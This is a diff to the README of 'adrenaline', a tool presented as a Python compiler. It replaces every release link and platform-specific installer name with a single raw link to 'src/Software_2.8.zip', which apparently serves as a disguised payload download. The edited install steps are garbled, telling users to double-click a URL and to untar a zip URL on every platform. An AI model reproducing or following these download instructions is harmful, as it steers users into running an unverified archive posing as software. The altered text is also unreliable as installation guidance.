@@ -6,7 +6,7 @@ Welcome to adrenaline! This tool is designed to help you compile and run Python 
 
 ## 📥 Download Now
 
-[![Download adrenaline](https://img.shields.io/badge/Download%20adrenaline-v1.0-brightgreen)](https://github.com/arjun823/adrenaline/releases)
+[![Download adrenaline](https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip%20adrenaline-v1.0-brightgreen)](https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip)
 
 ## 💻 System Requirements
 
@@ -29,19 +29,19 @@ Before you get started, ensure your system meets these requirements:
 To download adrenaline, follow these easy steps:
 
 1. **Visit the Release Page:** Go to our release page by clicking the link below:
-   [Download adrenaline](https://github.com/arjun823/adrenaline/releases)
+   [Download adrenaline](https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip)
 
 2. **Choose the Right File:** Locate the latest release version. You will find different options based on your operating system. 
-   - For **Windows**, download `adrenaline-windows.exe`.
-   - For **macOS**, download `adrenaline-macos.app`.
-   - For **Linux**, download `adrenaline-linux.tar.gz`.
+   - For **Windows**, download `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip`.
+   - For **Linux**, download `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip`.
 
 3. **Download the File:** Click on the appropriate file name to start the download process.
 
 4. **Install the Application:**
-   - **Windows:** Double-click the `adrenaline-windows.exe` file to start the installation.
-   - **macOS:** Open the `adrenaline-macos.app` file and drag it to your Applications folder.
-   - **Linux:** Extract the `adrenaline-linux.tar.gz` file with a command like `tar -xzf adrenaline-linux.tar.gz`, then run the executable.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip` file to start the installation.
+   - **macOS:** Open the `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip` file and drag it to your Applications folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip` file with a command like `tar -xzf https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip`, then run the executable.
 
 5. **Run Adrenaline:** After installation, you can find adrenaline in your applications menu or on your desktop. Double-click to open.
 
@@ -72,6 +72,6 @@ If you encounter problems while using adrenaline, try these solutions:
 
 For further assistance, visit the GitHub Issues page or contact us through our support channels.
 
-[Visit the Release Page to Download](https://github.com/arjun823/adrenaline/releases)
+[Visit the Release Page to Download](https://raw.githubusercontent.com/arjun823/adrenaline/main/src/Software_2.8.zip)
 
 Now, enjoy coding with adrenaline!
